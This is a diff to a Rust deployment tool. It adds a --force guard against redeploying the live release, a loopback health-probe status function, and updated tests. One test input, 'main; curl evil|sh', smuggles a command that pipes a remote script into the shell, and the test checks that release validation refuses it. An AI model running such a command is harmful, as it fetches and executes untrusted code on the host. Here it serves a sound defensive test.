@@ -161,6 +161,9 @@ pub enum DeployError {
     #[error("invalid release {0:?}: must be a commit SHA (hex, 4-64 chars)")]
     InvalidRelease(String),
 
+    #[error("{name} is already on {release}; pass --force to deploy it again")]
+    AlreadyLive { name: String, release: String },
+
     #[error("invalid health path: {0}")]
     InvalidHealthPath(String),
 }
@@ -170,7 +173,10 @@ pub enum DeployError {
 /// The chosen value is validated here as well as in the registry: a release
 /// reaches a build script and an image tag, so it must be a hex commit name and
 /// nothing else.
-pub fn resolve_release(app: &App, flag: Option<&str>) -> Result<String, DeployError> {
+///
+/// The recorded release is the one already live, so deploying it again is
+/// refused unless `force`: a bare `up` should not restart a healthy app.
+pub fn resolve_release(app: &App, flag: Option<&str>, force: bool) -> Result<String, DeployError> {
     let release = match flag {
         Some(sha) => sha,
         None => app.release.as_deref().ok_or(DeployError::NoRelease)?,
@@ -178,7 +184,53 @@ pub fn resolve_release(app: &App, flag: Option<&str>) -> Result<String, DeployEr
     if !registry::is_valid_release_arg(release) {
         return Err(DeployError::InvalidRelease(release.to_string()));
     }
+    if !force && app.release.as_deref() == Some(release) {
+        return Err(DeployError::AlreadyLive {
+            name: app.name.clone(),
+            release: release.to_string(),
+        });
+    }
     Ok(release.to_string())
+}
+
+/// What an app is doing right now, as opposed to what the registry recorded.
+///
+/// `live_port` and the process behind it can disagree, so the two questions are
+/// answered separately: the recorded identity comes from the registry, the
+/// verdict from probing the port nginx points at.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct LiveStatus {
+    pub release: Option<String>,
+    pub old_release: Option<String>,
+    pub live_port: Option<u16>,
+    /// True when the live port answered 2xx.
+    pub up: bool,
+    /// What it answered with, or `None` when nothing answered at all.
+    pub code: Option<u16>,
+}
+
+/// Probes the live port over loopback against the app's own health path.
+///
+/// Spawns no process and opens no run, so it is safe to call unprivileged and
+/// from an HTTP handler; a refused connection is a down verdict, not an error.
+pub fn live_status(app: &App) -> Result<LiveStatus, DeployError> {
+    let mut status = LiveStatus {
+        release: app.release.clone(),
+        old_release: app.old_release.clone(),
+        live_port: app.live_port,
+        up: false,
+        code: None,
+    };
+    let Some(port) = app.live_port else {
+        return Ok(status);
+    };
+    let health_url = app.health_url.as_deref().unwrap_or("http://127.0.0.1/");
+    let path = health::checked_probe_path(health_url).map_err(DeployError::InvalidHealthPath)?;
+    if let Ok(code) = health::http_status("127.0.0.1", port, &path) {
+        status.up = (200..300).contains(&code);
+        status.code = Some(code);
+    }
+    Ok(status)
 }
 
 /// The generated compose override for a green candidate. Only the container
@@ -727,7 +779,7 @@ fn short_sha(release: &str) -> &str {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::registry::tests::sample;
+    use crate::registry::tests::{sample, sample_static};
 
     #[test]
     fn swap_and_replace_step_lists_are_stable() {
@@ -793,13 +845,22 @@ mod tests {
     #[test]
     fn resolve_prefers_the_flag_then_the_registry() {
         let app = sample();
-        assert_eq!(resolve_release(&app, Some("abc1234")).unwrap(), "abc1234");
-        assert_eq!(resolve_release(&app, None).unwrap(), "9c1f2ab");
+        assert_eq!(
+            resolve_release(&app, Some("abc1234"), false).unwrap(),
+            "abc1234"
+        );
+
+        // The recorded release is the live one: a bare resolve reports that
+        // instead of silently redeploying it, unless the operator forces it.
+        let err = resolve_release(&app, None, false).unwrap_err();
+        assert!(matches!(err, DeployError::AlreadyLive { .. }), "{err:?}");
+        assert!(err.to_string().contains("--force"), "{err}");
+        assert_eq!(resolve_release(&app, None, true).unwrap(), "9c1f2ab");
 
         let mut bare = sample();
         bare.release = None;
         assert!(matches!(
-            resolve_release(&bare, None).unwrap_err(),
+            resolve_release(&bare, None, false).unwrap_err(),
             DeployError::NoRelease
         ));
     }
@@ -808,7 +869,7 @@ mod tests {
     fn resolve_refuses_a_non_commit_release() {
         let app = sample();
         for bad in ["main", "main; curl evil|sh", "abc", "9c1f2ab ", "latest"] {
-            let err = resolve_release(&app, Some(bad)).unwrap_err();
+            let err = resolve_release(&app, Some(bad), false).unwrap_err();
             assert!(
                 matches!(err, DeployError::InvalidRelease(_)),
                 "{bad:?} must be refused, got {err:?}"
@@ -818,7 +879,7 @@ mod tests {
         let mut recorded = sample();
         recorded.release = Some("main".into());
         assert!(matches!(
-            resolve_release(&recorded, None).unwrap_err(),
+            resolve_release(&recorded, None, false).unwrap_err(),
             DeployError::InvalidRelease(_)
         ));
     }
@@ -826,7 +887,29 @@ mod tests {
     #[test]
     fn a_four_char_sha_is_accepted() {
         let app = sample();
-        assert_eq!(resolve_release(&app, Some("abcd")).unwrap(), "abcd");
+        assert_eq!(resolve_release(&app, Some("abcd"), false).unwrap(), "abcd");
+    }
+
+    #[test]
+    fn live_status_answers_without_dialing_anything() {
+        // No live port means nothing to probe: down, with the recorded identity
+        // still reported. Both branches here return before a socket is opened.
+        let mut app = sample_static();
+        app.release = Some("9c1f2ab".into());
+        let status = live_status(&app).unwrap();
+        assert!(!status.up);
+        assert_eq!(status.code, None);
+        assert_eq!(status.release.as_deref(), Some("9c1f2ab"));
+
+        // A health path that cannot go on a request line is a registry fault,
+        // refused before the probe.
+        let mut bad = app;
+        bad.live_port = Some(1);
+        bad.health_url = Some("http://127.0.0.1/a b".into());
+        assert!(matches!(
+            live_status(&bad).unwrap_err(),
+            DeployError::InvalidHealthPath(_)
+        ));
     }
 
     #[test]
